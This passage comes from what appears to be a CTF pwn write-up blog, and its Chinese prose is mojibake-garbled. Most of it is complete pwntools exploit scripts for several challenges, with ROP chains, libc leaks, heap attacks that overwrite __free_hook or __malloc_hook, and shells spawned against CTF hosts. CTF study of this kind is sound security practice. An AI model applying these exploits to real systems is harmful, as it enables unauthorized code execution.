payload=payload1+payload2

payload=payload.ljust(0xfc,b&amp;quot;a&amp;quot;)+p32(0x38)
#   payload 0x100-&amp;gt; rbp low 1 byte -&amp;gt; \x00 -&amp;gt; point to stack
#   var_38[0x39] -&amp;gt; rbp+0x1 -&amp;gt; change nop to leave

io.sendafter(b&amp;quot;:&amp;quot;,payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))


################


# gdb.attach(io)
# pause()

payload1=str(0x18).encode().ljust(8,b&amp;quot;\x00&amp;quot;)+p64(ret)*21+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
payload1=payload1.ljust(0xd0,b&amp;quot;a&amp;quot;)
#   0x18 to change rbp+0x8 low 1 byte
payload2=p8(0x13)+p8(0x24)+p8(0x35)+p8(0x46)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)
payload=payload1+payload2

payload=payload.ljust(0xfc,b&amp;quot;a&amp;quot;)+p32(0x38)

io.sendafter(b&amp;quot;:&amp;quot;,payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400c9c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c9e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400ca0 : pop r14 ; pop r15 ; ret
# 0x0000000000400ca2 : pop r15 ; ret
# 0x0000000000400c9b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c9f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006b0 : pop rbp ; ret
# 0x0000000000400ca3 : pop rdi ; ret
# 0x0000000000400ca1 : pop rsi ; pop r15 ; ret
# 0x0000000000400c9d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005b9 : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pcb2023_silent&#34;&gt;pcb2023_silent&lt;/h3&gt;
&lt;p&gt;Full RelroÔºåÂè™Áªô‰∫Ü‰∏™readÔºå‰∫∫Â§™Ë†¢‰∫ÜÊâæ‰∏çÂà∞magic gadgetÔºåÂè™ÊúâÊö¥Âäõ&lt;br&gt;
ËøôÈáåÊàëÂä´ÊåÅÊ†à‰∏äÁöÑÊÆãÁïôÁöÑ‰∏ÄÂùólibc‰∏≠Âú∞ÂùÄÔºåÊâæÁöÑgadgetÂú®libcÂÅèÁßª‰∏∫&lt;code&gt;0x110130&lt;/code&gt;&lt;br&gt;
Â§ßÊ¶ÇÁéá‰∫ã‰ª∂ÊòØÁàÜ3‰Ωç,&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;4096&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1/16^3=1/4096&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;
ËøîÂõûÁöÑÊòØ&lt;code&gt;write+64&lt;/code&gt;ÔºåÊ∫¢Âá∫Á©∫Èó¥Ë∂≥Â§üÊéßÂà∂ÂØÑÂ≠òÂô®ÁöÑÂÄºÔºåÂèØ‰ª•leakÂá∫readÁöÑlibcÂú∞ÂùÄ&lt;br&gt;
ÁÑ∂ÂêéËøîÂõû&lt;code&gt;_start&lt;/code&gt;ÔºåÁÑ∂ÂêéÂæÄbssÊÆµ‰∏äÂÜôorw shellcode&lt;br&gt;
ËøîÂõû&lt;code&gt;_start&lt;/code&gt;ÔºåmprotectËµã‰∫àbssÊÆµrwxÊùÉÈôêÂêéÂÜçÊ¨°ËøîÂõû&lt;code&gt;_start&lt;/code&gt;ÔºåÊ∫¢Âá∫Ë∑≥ËΩ¨ÊâßË°åshellcodeÂç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

ggg=asm(shellcraft.open(&#39;./flag&#39;))+asm(shellcraft.read(3,0x601d00,0x100))+asm(shellcraft.write(1,0x601d00,0x100))

def pwn():

    ret=0x400696
    pop_rdi=0x400963
    pop_rsi_r15=0x400961
    main=0x400879
    pop_rbp=0x400788
    bss_addr=0x601800
    pop_rsp_r13_r14_r15=0x40095d
    read_plt=elf.plt[b&amp;quot;read&amp;quot;]


    # for i in range(2):
    #     payload=cyclic(0x48)+p64(main)
    #     io.send(payload)


    # payload=p64(elf.got[b&amp;quot;read&amp;quot;])*0x10
    # io.send(payload)

    # gdb.attach(io)
    # pause()

    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;read&amp;quot;])*2+b&amp;quot;\x30\xf1\x8d&amp;quot;
    io.send(payload)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;read&amp;quot;]
    print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

    open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
    read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
    write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
    mprotect_a=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
    pop_rdx=leak_addr+0x1b96
    syscall_ret=leak_addr+0x0b1165
    pop_rax=leak_addr+0x1ced0


    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr)*2+p64(read_plt)+p64(0x400720)
    io.send(payload)

    io.send(ggg)

    mpp=p64(pop_rdi)+p64(0x601000)+p64(pop_rsi_r15)+p64(0x1000)+p64(0)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(0x400720)

    payload=p64(bss_addr)*9+mpp
    io.send(payload)

    # gdb.attach(io)
    # pause()

    payload=p64(bss_addr)*10
    io.send(payload)
    
    sleep(0.2)
    t=io.recv()
    print(t)
    

while True:
    try:
        # io=process(&amp;quot;./silent&amp;quot;)
        io=remote(&amp;quot;172.10.0.8&amp;quot;,9999)
        elf=ELF(&amp;quot;./silent&amp;quot;)
        libc=elf.libc
        pwn()
        
    except:
        io.close()
        continue

# Gadgets information
# ============================================================
# 0x0000000000400876 : leave ; ret
# 0x00000000004007e2 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
# 0x00000000004008f7 : mov eax, 0 ; leave ; ret
# 0x000000000040095c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400960 : pop r14 ; pop r15 ; ret
# 0x0000000000400962 : pop r15 ; ret
# 0x000000000040095b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400788 : pop rbp ; ret
# 0x0000000000400963 : pop rdi ; ret
# 0x0000000000400961 : pop rsi ; pop r15 ; ret
# 0x000000000040095d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400696 : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dfjk2022_smallcontainer&#34;&gt;dfjk2022_smallcontainer:&lt;/h3&gt;
&lt;p&gt;Ê≤°ÊúâuafÔºå‰∏çËøáeditÁöÑÊó∂ÂÄôÊúâ&lt;code&gt;check()&lt;/code&gt;‰ºöÊ£ÄÊü•ËæìÂÖ•ÊòØÂê¶‰∏∫&lt;code&gt;\x11&lt;/code&gt;Ôºå‰ºöÂ∞Ü&lt;code&gt;\x11&lt;/code&gt;ÁΩÆ0,Êàë‰ª¨Âè™ÈúÄË¶ÅÂ∞ÜeditÁöÑÂ†ÜÂùóÂÖ®ÈÉ®ÂÜôÊª°&lt;code&gt;\x11&lt;/code&gt;ÔºåÊåáÈíàÈÄíÂ¢ûÂà∞‰∏ã‰∏™Â†ÜÂùóÁöÑ&lt;code&gt;\x11&lt;/code&gt;‰πü‰ºöÁΩÆ0,ËøôÊ†∑Êàë‰ª¨Â∞±Êúâ‰∏Ä‰∏™off by null‰∫Ü&lt;br&gt;
showÊó†Ê£ÄÊü•ÂèØ‰ª•Ê≥ÑÈú≤libc&lt;br&gt;
ÂêéÈù¢ÊûÑÈÄ†unlinkÂç≥ÂèØÔºåÊ≥®ÊÑèÊûÑÈÄ†unlinkÁöÑËß¶ÂèëÂ†ÜÂùó‰∏çËÉΩÂú®tcacheÈáåÈù¢&lt;br&gt;
unlinkÂêéchunk overlapÔºåÊúÄÂêétcachebin attackÂä´ÊåÅ&lt;code&gt;__free_hook&lt;/code&gt;‰∏∫&lt;code&gt;one_gadget&lt;/code&gt;Âç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28820)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=elf.libc

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    io.send(cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(0x120)

add(0x130) #8

for i in range(8):
    delete(i)
    
add(0x100) #0
show(0)
leak_addr=int(io.recv(12),16)-0x3ebdc0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f302


delete(0)
delete(8)

for i in range(7):
    add(0x1f8)

add(0x1f8) #7
add(0x228) #8
add(0x200) #9
add(0x220) #10
add(0x228) #11


#unlink
for i in range(7):
    delete(i)
    
delete(7)

payload=b&amp;quot;\x11&amp;quot;*0x228
edit(8,payload)

payload=b&amp;quot;\x11&amp;quot;*0x220+p64(0x430)
edit(8,payload)

payload=b&amp;quot;\x11&amp;quot;*0x1f8+p64(0x241)
edit(9,payload)
delete(9)



#overlap
delete(11)
delete(8)

add(0x250) #0
edit(0,b&amp;quot;\x00&amp;quot;*0x1f8+p64(0x230)+p64(free_hook))

add(0x228) #1
add(0x228) #2
edit(2,p64(shell))

delete(2)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;gkctf2020_domo&#34;&gt;gkctf2020_domo:&lt;/h3&gt;
&lt;p&gt;addÂ≠òÂú®off by nullÔºåÂèØ‰ª•unlinkÊûÑÈÄ†chunk overlap&lt;br&gt;
Âä´ÊåÅ&lt;code&gt;__malloc_hook&lt;/code&gt;‰∏∫&lt;code&gt;one_gadget&lt;/code&gt;&lt;br&gt;
Â¶ÇÊûúÁõ¥Êé•addË∞ÉÁî®&lt;code&gt;__malloc_hook&lt;/code&gt;‰ºöÊúâÊ£ÄÊü•&lt;br&gt;
ÂèØ‰ª•Âà©Áî®scanfËæìÂÖ•ËøáÈïøÊï∞ÊçÆËß¶Âèë&lt;code&gt;malloc()&lt;/code&gt;Êãøshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./domo&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28478)
elf=ELF(&amp;quot;./domo&amp;quot;)
libc=elf.libc

def add(s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))

def edit(n,addr,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;addr:\n&amp;quot;,str(addr))
    io.sendafter(b&amp;quot;num:\n&amp;quot;,cc)
    
# gdb.attach(io)
# pause()

add(0x100,b&amp;quot;nmsl&amp;quot;) #0
add(0x20,b&amp;quot;gap&amp;quot;) #1
delete(0)
add(0x100,b&amp;quot;a&amp;quot;) #0
show(0)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c4b61
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=leak_addr+0xf1247

add(0xf0,b&amp;quot;aaa&amp;quot;) #2
add(0x68,b&amp;quot;ddd&amp;quot;) #3
add(0xf0,b&amp;quot;eee&amp;quot;) #4
add(0xf0,b&amp;quot;gap&amp;quot;) #5

delete(2)
delete(3)
add(0x68,b&amp;quot;\x00&amp;quot;*0x60+p64(0x170)) #2
delete(4)

delete(2)

add(0x108,cyclic(0xf8)+p64(0x70)+p64(malloc_hook-0x23))

add(0x60,b&amp;quot;rrr&amp;quot;) #6
add(0x60,cyclic(0x13)+p64(shell)) #7

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;*0x10000)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xyb2021_passwordbox_freeversion&#34;&gt;xyb2021_PassWordBox_FreeVersion:&lt;/h3&gt;
&lt;p&gt;addÂíåshowÊúâÂºÇÊàñÊìç‰ΩúÔºåeditÊó†ÔºåÁî±‰∫é&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;‚ÄÖ‚Ää&lt;/mtext&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;‚ÄÖ‚Ää&lt;/mtext&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mspace width=&#34;1em&#34;/&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a \; xor \; 0=a \quad(a&amp;gt;=0)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:1em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ÔºåÊâÄ‰ª•ÈááÁî®&lt;code&gt;\x00&lt;/code&gt;Ê≥ÑÈú≤ÂºÇÊàñÁöÑ&lt;code&gt;key&lt;/code&gt;&lt;br&gt;
addÂ≠òÂú®off by nullÔºåÈááÁî®unlinkÊâìchunk overlap&lt;br&gt;
ÁÑ∂Âêé2.27ÂèØ‰ª•double freeÔºåÂä´ÊåÅ&lt;code&gt;__free_hook&lt;/code&gt;‰∏∫&lt;code&gt;one_gadget&lt;/code&gt;Âç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;PassWordBox_FreeVersionfrom pwn import *
context(log_level=&amp;quot;debug&amp;quot;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwdFree&amp;quot;) 
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28820)
elf=ELF(&amp;quot;./pwdFree&amp;quot;)
libc=elf.libc

def add(s,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Save:&amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;Of Your Pwd:&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Your Pwd:&amp;quot;,cc)
    
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendline(str(n))
    io.send(cc)
    
    
def show(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Check:\n&amp;quot;,str(n))
    
    
def delete(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Delete:\n&amp;quot;,str(n))


# gdb.attach(io)
# pause()

add(0xf8,b&amp;quot;\x00&amp;quot;*8)
io.recvuntil(b&amp;quot;ID:&amp;quot;)
key=u64(io.recv(8))
print(&amp;quot;key: &amp;quot;,hex(key))
delete(0)

#unlink
for i in range(8):
    add(0xf8,b&amp;quot;a&amp;quot;)

add(0x68,b&amp;quot;aa&amp;quot;) #8
add(0xf8,b&amp;quot;aa&amp;quot;) #9
add(0x20,b&amp;quot;gap&amp;quot;) #10

for i in range(8):
    delete(i)

delete(8)
payload=p64(0xdeadbeef^key)*0xc+p64(0x170^key)
add(0x68,payload)

delete(9)

delete(8)

# ###
for i in range(7):
    add(0xf8,b&amp;quot;www&amp;quot;)

add(0xf8,b&amp;quot;aaa&amp;quot;) #8
show(0)
io.recvuntil(b&amp;quot;is: &amp;quot;)
leak_addr=u64(io.recv(8))^key
leak_addr-=0x3ebca0
print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

shell=leak_addr+0x4f432
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

add(0x60,b&amp;quot;asd&amp;quot;) #9
show(9)
delete(0)
edit(9,p64(0)*2)
show(9)
delete(9)

add(0x60,p64(free_hook^key))
add(0x60,b&amp;quot;a&amp;quot;)
add(0x60,p64(shell^key))

delete(8)

io.interactive()                     

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xyb2021_passwordbox_proversion&#34;&gt;xyb2021_PassWordBox_ProVersion:&lt;/h3&gt;
&lt;p&gt;Âè™ËÉΩÁî≥ËØ∑largebinÂ§ßÂ∞èËåÉÂõ¥ÁöÑÂ†ÜÂùóÔºåÈááÁî®largebin attackÊâìmpÁöÑÊñπÊ≥ïÔºåÁÑ∂Âêétcache poisoningÂ∏¶Ëµ∞&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwdPro&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28934)
elf=ELF(&amp;quot;./pwdPro&amp;quot;)
libc=elf.libc

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Add:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Save:&amp;quot;,b&amp;quot;a&amp;quot;*3)
    io.sendlineafter(b&amp;quot;Pwd:&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Pwd:&amp;quot;,cc)

def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Edit:\n&amp;quot;,str(n))
    io.send(cc)

def show(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Check:\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Delete:\n&amp;quot;,str(n))

def recover(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;Recover:\n&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0,0x5a0,b&amp;quot;\x00&amp;quot;)
io.recvuntil(b&amp;quot;ID:&amp;quot;)
key=u64(io.recv(8))
print(&amp;quot;key: &amp;quot;,hex(key))

add(1,0x590,b&amp;quot;a&amp;quot;*8)
add(2,0x590,b&amp;quot;a&amp;quot;*8)

delete(0)
recover(0)
show(0)

io.recvuntil(b&amp;quot;is: &amp;quot;)

leak_addr=(u64(io.recv(8))^key)-0x1eb1e0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_addr=leak_addr+0x1eb2d0


### largebin_attack
add(15,0x800,b&amp;quot;a&amp;quot;*8)
payload=p64(leak_addr+0x1ec010)*2+p64(mp_addr-0x20)*2
edit(0,payload)

delete(2)

add(16,0x800,b&amp;quot;a&amp;quot;)
###

add(6,0x600,b&amp;quot;a&amp;quot;)
add(7,0x600,b&amp;quot;a&amp;quot;)
add(8,0x600,b&amp;quot;a&amp;quot;)

delete(6)
recover(6)
delete(7)
recover(7)

edit(7,p64(free_hook))
add(6,0x600,b&amp;quot;a&amp;quot;)
add(7,0x600,b&amp;quot;a&amp;quot;)
edit(7,p64(sys_addr))

edit(16,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(16)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_arrary_index_bank&#34;&gt;ycb2023_arrary_index_bank:&lt;/h3&gt;
&lt;p&gt;OOB read &amp;amp; write&lt;br&gt;
